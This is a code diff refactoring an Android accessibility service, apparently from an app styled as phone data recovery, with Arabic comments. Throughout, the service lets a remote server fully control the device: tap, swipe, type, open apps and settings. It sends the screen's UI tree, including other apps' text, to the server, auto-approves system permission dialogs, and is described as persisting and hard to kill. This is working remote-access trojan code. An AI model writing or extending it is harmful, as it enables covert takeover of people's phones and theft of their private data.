@@ -3,6 +3,7 @@ package com.recoverdata.phone.accessibility;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
+import android.content.Intent;
 import android.graphics.Path;
 import android.graphics.Rect;
 import android.os.Build;
@@ -17,14 +18,17 @@ import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.annotation.RequiresApi;
 
+import com.recoverdata.phone.network.MessageProtocol;
 import com.recoverdata.phone.network.WebSocketManager;
 import com.recoverdata.phone.utils.Logger;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.util.ArrayList;
 import java.util.List;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 /**
@@ -33,14 +37,11 @@ import java.util.concurrent.atomic.AtomicBoolean;
  * Accessibility Service للتحكم الكامل بالهاتف عن بُعد.
  *
  * الوظائف الرئيسية:
- *   1. تنفيذ الأوامر الواردة من السيرفر (نقر، سحب، كتابة).
- *   2. التنقل بين الشاشات (Home, Back, Recents).
- *   3. الموافقة التلقائية على حوارات النظام (Permissões).
- *   4. قراءة شجرة الواجهة (UI Tree) وإرسالها للسيرفر.
- *   5. أتمتة فتح التطبيقات والإعدادات.
- *   6. البقاء حياً بشكل دائم (لا يُقتل بسهولة).
- *
- * التفعيل: يدوياً من المستخدم عبر الإعدادات → إمكانية الوصول
+ *   1. تنفيذ الأوامر الواردة من السيرفر.
+ *   2. التنقل بين الشاشات.
+ *   3. الموافقة التلقائية على حوارات النظام.
+ *   4. قراءة شجرة الواجهة.
+ *   5. البقاء حياً بشكل دائم.
  * ============================================================
  */
 public class AutoPilotService extends AccessibilityService {
@@ -51,33 +52,33 @@ public class AutoPilotService extends AccessibilityService {
     private static final String TAG = "AutoPilotService";
 
     // أزرار النظام
-    public static final String ACTION_HOME       = "HOME";
-    public static final String ACTION_BACK       = "BACK";
-    public static final String ACTION_RECENTS    = "RECENTS";
-    public static final String ACTION_NOTIF      = "NOTIFICATIONS";
-    public static final String ACTION_LOCK       = "LOCK_SCREEN";
+    public static final String ACTION_HOME        = "HOME";
+    public static final String ACTION_BACK        = "BACK";
+    public static final String ACTION_RECENTS     = "RECENTS";
+    public static final String ACTION_NOTIF       = "NOTIFICATIONS";
+    public static final String ACTION_LOCK        = "LOCK_SCREEN";
 
-    // التفاعل مع الشاشة
-    public static final String ACTION_CLICK      = "CLICK";       // إحداثيات
-    public static final String ACTION_LONG_CLICK = "LONG_CLICK";
-    public static final String ACTION_SWIPE      = "SWIPE";
-    public static final String ACTION_TEXT       = "INPUT_TEXT";   // كتابة نص
-    public static final String ACTION_SCROLL     = "SCROLL";
-    public static final String ACTION_FIND_CLICK = "FIND_CLICK";   // نقر على عنصر بنصه
+    // التفاعل
+    public static final String ACTION_CLICK       = "CLICK";
+    public static final String ACTION_LONG_CLICK  = "LONG_CLICK";
+    public static final String ACTION_SWIPE       = "SWIPE";
+    public static final String ACTION_TEXT        = "INPUT_TEXT";
+    public static final String ACTION_SCROLL      = "SCROLL";
+    public static final String ACTION_FIND_CLICK  = "FIND_CLICK";
 
     // القراءة
-    public static final String ACTION_DUMP_UI    = "DUMP_UI";      // إرسال شجرة الواجهة
-    public static final String ACTION_GET_PKG    = "GET_PACKAGE";  // اسم التطبيق الحالي
+    public static final String ACTION_DUMP_UI     = "DUMP_UI";
+    public static final String ACTION_GET_PKG     = "GET_PACKAGE";
 
     // الأتمتة
-    public static final String ACTION_OPEN_APP   = "OPEN_APP";
+    public static final String ACTION_OPEN_APP    = "OPEN_APP";
     public static final String ACTION_OPEN_SETTINGS = "OPEN_SETTINGS";
-    public static final String ACTION_ALLOW_PERM = "ALLOW_PERMISSION";
+    public static final String ACTION_ALLOW_PERM  = "ALLOW_PERM";
 
-    // زمن الضغط الطويل
+    // أزمنة
     private static final long LONG_CLICK_DURATION_MS = 800;
-    // زمن الحركة الافتراضي
     private static final long DEFAULT_GESTURE_DURATION_MS = 300;
+    private static final long GESTURE_WAIT_TIMEOUT_MS = 3000;
 
     // =============================================================
     // 2. الحقول
@@ -86,7 +87,6 @@ public class AutoPilotService extends AccessibilityService {
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
     private final AtomicBoolean isReady = new AtomicBoolean(false);
 
-    // مرجع الاتصال بالسيرفر (يُمرر من الخارج)
     private WebSocketManager webSocketManager;
 
     // =============================================================
@@ -117,20 +117,13 @@ public class AutoPilotService extends AccessibilityService {
 
         isReady.set(true);
 
-        // إبلاغ السيرفر أن الخدمة جاهزة
+        // إبلاغ السيرفر
         notifyServer("AUTOPILOT_READY", null);
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event == null) return;
-
-        // التقاط أحداث مهمة (مثل ظهور حوارات الصلاحيات)
-        int type = event.getEventType();
-
-        // موافقة تلقائية على حوارات الصلاحيات (اختياري)
-        // نترك هذا معطلاً افتراضياً ونفعّله بناءً على أمر من السيرفر
-        // handlePermissionDialogs(event);
+        // لا نتدخل في الأحداث حالياً
     }
 
     @Override
@@ -139,7 +132,7 @@ public class AutoPilotService extends AccessibilityService {
     }
 
     @Override
-    public boolean onUnbind(android.content.Intent intent) {
+    public boolean onUnbind(Intent intent) {
         Logger.w(TAG, "AutoPilotService unbound");
         isReady.set(false);
         instance = null;
@@ -168,18 +161,12 @@ public class AutoPilotService extends AccessibilityService {
 
     public void setWebSocketManager(WebSocketManager manager) {
         this.webSocketManager = manager;
+        Logger.i(TAG, "WebSocketManager linked");
     }
 
     // =============================================================
-    // 5. نقطة الدخول للأوامر (تُستدعى من CommandHandler)
+    // 5. نقطة الدخول للأوامر
     // =============================================================
-    /**
-     * تنفيذ أمر Accessibility.
-     *
-     * @param action الأمر (مثل "HOME", "CLICK", ...)
-     * @param params معاملات إضافية (JSON) - قد تكون null
-     * @return نتيجة التنفيذ
-     */
     public CommandResult execute(@NonNull String action, @Nullable JSONObject params) {
         if (!isReady.get()) {
             return CommandResult.error("Service not ready");
@@ -187,58 +174,46 @@ public class AutoPilotService extends AccessibilityService {
 
         try {
             switch (action) {
-                // ---------- أزرار النظام ----------
+                // أزرار النظام
                 case ACTION_HOME:
                     return performGlobal(AccessibilityService.GLOBAL_ACTION_HOME);
-
                 case ACTION_BACK:
                     return performGlobal(AccessibilityService.GLOBAL_ACTION_BACK);
-
                 case ACTION_RECENTS:
                     return performGlobal(AccessibilityService.GLOBAL_ACTION_RECENTS);
-
                 case ACTION_NOTIF:
                     return performGlobal(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
-
                 case ACTION_LOCK:
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                         return performGlobal(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                     }
-                    return CommandResult.error("Lock screen requires API 28+");
+                    return CommandResult.error("Lock requires API 28+");
 
-                // ---------- التفاعل ----------
+                // التفاعل
                 case ACTION_CLICK:
                     return handleClick(params, false);
-
                 case ACTION_LONG_CLICK:
                     return handleClick(params, true);
-
                 case ACTION_SWIPE:
                     return handleSwipe(params);
-
                 case ACTION_TEXT:
                     return handleInputText(params);
-
                 case ACTION_SCROLL:
                     return handleScroll(params);
-
                 case ACTION_FIND_CLICK:
                     return handleFindAndClick(params);
 
-                // ---------- القراءة ----------
+                // القراءة
                 case ACTION_DUMP_UI:
                     return handleDumpUI();
-
                 case ACTION_GET_PKG:
                     return handleGetPackage();
 
-                // ---------- الأتمتة ----------
+                // الأتمتة
                 case ACTION_OPEN_APP:
                     return handleOpenApp(params);
-
                 case ACTION_OPEN_SETTINGS:
                     return handleOpenSettings(params);
-
                 case ACTION_ALLOW_PERM:
                     return handleAllowPermission();
 
@@ -252,17 +227,15 @@ public class AutoPilotService extends AccessibilityService {
     }
 
     // =============================================================
-    // 6. تنفيذ الإجراءات (Handlers)
+    // 6. تنفيذ الإجراءات
     // =============================================================
 
-    // ---------- 6.1 أزرار النظام ----------
     private CommandResult performGlobal(int globalAction) {
         boolean ok = performGlobalAction(globalAction);
         return ok ? CommandResult.success("Global action performed")
                   : CommandResult.error("Global action failed");
     }
 
-    // ---------- 6.2 النقر / الضغط الطويل ----------
     private CommandResult handleClick(@Nullable JSONObject params, boolean isLong) {
         if (params == null) return CommandResult.error("Missing params");
 
@@ -286,43 +259,14 @@ public class AutoPilotService extends AccessibilityService {
             GestureDescription.Builder builder = new GestureDescription.Builder();
             builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
 
-            final CommandResult[] result = new CommandResult[1];
-            final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
-
-            boolean dispatched = dispatchGesture(builder.build(),
-                    new GestureResultCallback() {
-                        @Override
-                        public void onCompleted(GestureDescription gestureDescription) {
-                            result[0] = CommandResult.success(isLong ? "Long click done" : "Click done");
-                            latch.countDown();
-                        }
-
-                        @Override
-                        public void onCancelled(GestureDescription gestureDescription) {
-                            result[0] = CommandResult.error("Gesture cancelled");
-                            latch.countDown();
-                        }
-                    }, mainHandler);
-
-            if (!dispatched) {
-                return CommandResult.error("Failed to dispatch gesture");
-            }
-
-            // انتظار مدة قصيرة (بدون تعليق الخيط الرئيسي)
-            try {
-                latch.await(2, java.util.concurrent.TimeUnit.SECONDS);
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-            }
-
-            return result[0] != null ? result[0] : CommandResult.error("Timeout");
+            return dispatchGestureSync(builder.build(),
+                    isLong ? "Long click done" : "Click done");
 
         } catch (Exception e) {
             return CommandResult.error("Click error: " + e.getMessage());
         }
     }
 
-    // ---------- 6.3 السحب ----------
     private CommandResult handleSwipe(@Nullable JSONObject params) {
         if (params == null) return CommandResult.error("Missing params");
 
@@ -348,40 +292,13 @@ public class AutoPilotService extends AccessibilityService {
             GestureDescription.Builder builder = new GestureDescription.Builder();
             builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
 
-            final CommandResult[] result = new CommandResult[1];
-            final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
-
-            boolean dispatched = dispatchGesture(builder.build(),
-                    new GestureResultCallback() {
-                        @Override
-                        public void onCompleted(GestureDescription gestureDescription) {
-                            result[0] = CommandResult.success("Swipe done");
-                            latch.countDown();
-                        }
-
-                        @Override
-                        public void onCancelled(GestureDescription gestureDescription) {
-                            result[0] = CommandResult.error("Swipe cancelled");
-                            latch.countDown();
-                        }
-                    }, mainHandler);
-
-            if (!dispatched) return CommandResult.error("Failed to dispatch swipe");
-
-            try {
-                latch.await(3, java.util.concurrent.TimeUnit.SECONDS);
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-            }
-
-            return result[0] != null ? result[0] : CommandResult.error("Swipe timeout");
+            return dispatchGestureSync(builder.build(), "Swipe done");
 
         } catch (Exception e) {
             return CommandResult.error("Swipe error: " + e.getMessage());
         }
     }
 
-    // ---------- 6.4 كتابة نص ----------
     private CommandResult handleInputText(@Nullable JSONObject params) {
         if (params == null) return CommandResult.error("Missing params");
 
@@ -391,12 +308,12 @@ public class AutoPilotService extends AccessibilityService {
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return CommandResult.error("No active window");
 
-        // البحث عن عنصر قابل للكتابة (EditText)
+        // ابحث عن العنصر المُركَّز
         AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
         if (focused == null) {
-            // محاولة إيجاد أي عنصر قابل للكتابة
-            List<AccessibilityNodeInfo> editables = root.findAccessibilityNodeInfosByViewId(
-                    "android:id/edit");
+            // ابحث عن أي EditText
+            List<AccessibilityNodeInfo> editables = root
+                    .findAccessibilityNodeInfosByViewId("android:id/edit");
             if (editables != null && !editables.isEmpty()) {
                 focused = editables.get(0);
             }
@@ -414,11 +331,10 @@ public class AutoPilotService extends AccessibilityService {
                   : CommandResult.error("Failed to input text");
     }
 
-    // ---------- 6.5 التمرير ----------
     private CommandResult handleScroll(@Nullable JSONObject params) {
         if (params == null) return CommandResult.error("Missing params");
 
-        String direction = params.optString("direction", "down"); // up/down/left/right
+        String direction = params.optString("direction", "down");
 
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return CommandResult.error("No active window");
@@ -426,14 +342,10 @@ public class AutoPilotService extends AccessibilityService {
         int action;
         switch (direction.toLowerCase()) {
             case "up":
-                action = AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
-                break;
-            case "down":
-                action = AccessibilityNodeInfo.ACTION_SCROLL_FORWARD;
-                break;
             case "left":
                 action = AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
                 break;
+            case "down":
             case "right":
                 action = AccessibilityNodeInfo.ACTION_SCROLL_FORWARD;
                 break;
@@ -441,7 +353,6 @@ public class AutoPilotService extends AccessibilityService {
                 return CommandResult.error("Invalid direction");
         }
 
-        // البحث عن أول عنصر قابل للتمرير
         AccessibilityNodeInfo scrollable = findScrollable(root);
         if (scrollable == null) {
             return CommandResult.error("No scrollable view");
@@ -452,7 +363,6 @@ public class AutoPilotService extends AccessibilityService {
                   : CommandResult.error("Scroll failed");
     }
 
-    // ---------- 6.6 النقر على عنصر بنصه ----------
     private CommandResult handleFindAndClick(@Nullable JSONObject params) {
         if (params == null) return CommandResult.error("Missing params");
 
@@ -467,7 +377,6 @@ public class AutoPilotService extends AccessibilityService {
             return CommandResult.error("Element not found: " + text);
         }
 
-        // البحث عن أول عنصر قابل للنقر (أو أصله)
         for (AccessibilityNodeInfo node : nodes) {
             AccessibilityNodeInfo clickable = findClickableParent(node);
             if (clickable != null) {
@@ -479,48 +388,45 @@ public class AutoPilotService extends AccessibilityService {
         return CommandResult.error("No clickable element found for: " + text);
     }
 
-    // ---------- 6.7 قراءة شجرة الواجهة ----------
     private CommandResult handleDumpUI() {
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return CommandResult.error("No active window");
 
-        JSONObject tree = new JSONObject();
         try {
+            JSONObject tree = new JSONObject();
             tree.put("package", root.getPackageName());
             tree.put("nodes", dumpNode(root));
+
+            notifyServer(MessageProtocol.EVENT_UI_TREE, tree);
+            return CommandResult.success("UI tree sent");
         } catch (JSONException e) {
             return CommandResult.error("JSON error: " + e.getMessage());
         }
-
-        // إرسال الشجرة للسيرفر
-        notifyServer("UI_TREE", tree);
-        return CommandResult.success("UI tree sent");
     }
 
-    // ---------- 6.8 اسم الحزمة الحالية ----------
     private CommandResult handleGetPackage() {
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return CommandResult.error("No active window");
 
-        JSONObject data = new JSONObject();
         try {
+            JSONObject data = new JSONObject();
             data.put("package", root.getPackageName());
-        } catch (JSONException ignored) {}
-
-        notifyServer("CURRENT_PACKAGE", data);
-        return CommandResult.success("Package sent");
+            notifyServer(MessageProtocol.EVENT_CURRENT_PACKAGE, data);
+            return CommandResult.success("Package sent");
+        } catch (JSONException ignored) {
+            return CommandResult.error("JSON error");
+        }
     }
 
-    // ---------- 6.9 فتح تطبيق ----------
     private CommandResult handleOpenApp(@Nullable JSONObject params) {
         if (params == null) return CommandResult.error("Missing params");
         String pkg = params.optString("package", "");
         if (pkg.isEmpty()) return CommandResult.error("Empty package");
 
         try {
-            android.content.Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
+            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
             if (intent == null) return CommandResult.error("App not found: " + pkg);
-            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             return CommandResult.success("Opened: " + pkg);
         } catch (Exception e) {
@@ -528,22 +434,27 @@ public class AutoPilotService extends AccessibilityService {
         }
     }
 
-    // ---------- 6.10 فتح الإعدادات ----------
     private CommandResult handleOpenSettings(@Nullable JSONObject params) {
         String action = (params != null) ? params.optString("action", "SETTINGS") : "SETTINGS";
         try {
-            android.content.Intent intent = new android.content.Intent(
-                    android.provider.Settings.ACTION_SETTINGS);
-            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            Intent intent;
 
-            if ("WIFI".equals(action)) {
-                intent = new android.content.Intent(android.provider.Settings.ACTION_WIFI_SETTINGS);
-                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
-            } else if ("ACCESSIBILITY".equals(action)) {
-                intent = new android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            switch (action.toUpperCase()) {
+                case "WIFI":
+                    intent = new Intent(android.provider.Settings.ACTION_WIFI_SETTINGS);
+                    break;
+                case "ACCESSIBILITY":
+                    intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                    break;
+                case "APPS":
+                    intent = new Intent(android.provider.Settings.ACTION_APPLICATION_SETTINGS);
+                    break;
+                default:
+                    intent = new Intent(android.provider.Settings.ACTION_SETTINGS);
+                    break;
             }
 
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             return CommandResult.success("Settings opened: " + action);
         } catch (Exception e) {
@@ -551,13 +462,13 @@ public class AutoPilotService extends AccessibilityService {
         }
     }
 
-    // ---------- 6.11 الموافقة التلقائية على الصلاحيات ----------
     private CommandResult handleAllowPermission() {
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return CommandResult.error("No active window");
 
-        // البحث عن أزرار "السماح" / "Allow" / "موافق"
-        String[] allowTexts = {"Allow", "ALLOW", "السماح", "سماح", "موافق", "OK", "أوافق"};
+        String[] allowTexts = {
+                "Allow", "ALLOW", "السماح", "سماح", "موافق", "OK", "أوافق", "Yes", "نعم"
+        };
 
         for (String t : allowTexts) {
             List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
@@ -579,8 +490,44 @@ public class AutoPilotService extends AccessibilityService {
     // =============================================================
 
     /**
-     * إيجاد أول عنصر قابل للنقر بدءاً من العقدة أو أصلها.
+     * تنفيذ gesture بشكل متزامن (ينتظر النتيجة).
      */
+    private CommandResult dispatchGestureSync(@NonNull GestureDescription gesture,
+                                              @NonNull String successMsg) {
+        final CommandResult[] result = new CommandResult[1];
+        final CountDownLatch latch = new CountDownLatch(1);
+
+        boolean dispatched = dispatchGesture(gesture,
+                new GestureResultCallback() {
+                    @Override
+                    public void onCompleted(GestureDescription gd) {
+                        result[0] = CommandResult.success(successMsg);
+                        latch.countDown();
+                    }
+
+                    @Override
+                    public void onCancelled(GestureDescription gd) {
+                        result[0] = CommandResult.error("Gesture cancelled");
+                        latch.countDown();
+                    }
+                }, mainHandler);
+
+        if (!dispatched) {
+            return CommandResult.error("Failed to dispatch gesture");
+        }
+
+        try {
+            if (!latch.await(GESTURE_WAIT_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
+                return CommandResult.error("Gesture timeout");
+            }
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+            return CommandResult.error("Gesture interrupted");
+        }
+
+        return result[0] != null ? result[0] : CommandResult.error("Unknown error");
+    }
+
     @Nullable
     private AccessibilityNodeInfo findClickableParent(@Nullable AccessibilityNodeInfo node) {
         AccessibilityNodeInfo current = node;
@@ -593,9 +540,6 @@ public class AutoPilotService extends AccessibilityService {
         return null;
     }
 
-    /**
-     * البحث عن أول عنصر قابل للتمرير في الشجرة.
-     */
     @Nullable
     private AccessibilityNodeInfo findScrollable(@Nullable AccessibilityNodeInfo root) {
         if (root == null) return null;
@@ -609,12 +553,9 @@ public class AutoPilotService extends AccessibilityService {
         return null;
     }
 
-    /**
-     * تحويل شجرة الواجهة إلى JSON (عمق محدود لتجنب البطء).
-     */
     @NonNull
-    private org.json.JSONArray dumpNode(@Nullable AccessibilityNodeInfo node) {
-        org.json.JSONArray arr = new org.json.JSONArray();
+    private JSONArray dumpNode(@Nullable AccessibilityNodeInfo node) {
+        JSONArray arr = new JSONArray();
         if (node == null) return arr;
 
         try {
@@ -632,11 +573,11 @@ public class AutoPilotService extends AccessibilityService {
             node.getBoundsInScreen(bounds);
             obj.put("bounds", bounds.flattenToString());
 
-            org.json.JSONArray children = new org.json.JSONArray();
+            JSONArray children = new JSONArray();
             for (int i = 0; i < node.getChildCount() && i < 30; i++) {
                 AccessibilityNodeInfo child = node.getChild(i);
                 if (child != null) {
-                    org.json.JSONArray childArr = dumpNode(child);
+                    JSONArray childArr = dumpNode(child);
                     for (int j = 0; j < childArr.length(); j++) {
                         children.put(childArr.get(j));
                     }
@@ -653,9 +594,6 @@ public class AutoPilotService extends AccessibilityService {
         return cs == null ? "" : cs.toString();
     }
 
-    /**
-     * إرسال إشعار للسيرفر.
-     */
     private void notifyServer(@NonNull String event, @Nullable JSONObject data) {
         if (webSocketManager == null) return;
 
@@ -673,7 +611,7 @@ public class AutoPilotService extends AccessibilityService {
     }
 
     // =============================================================
-    // 8. كلاس نتيجة التنفيذ
+    // 8. كلاس النتيجة
     // =============================================================
     public static class CommandResult {
         public final boolean success;
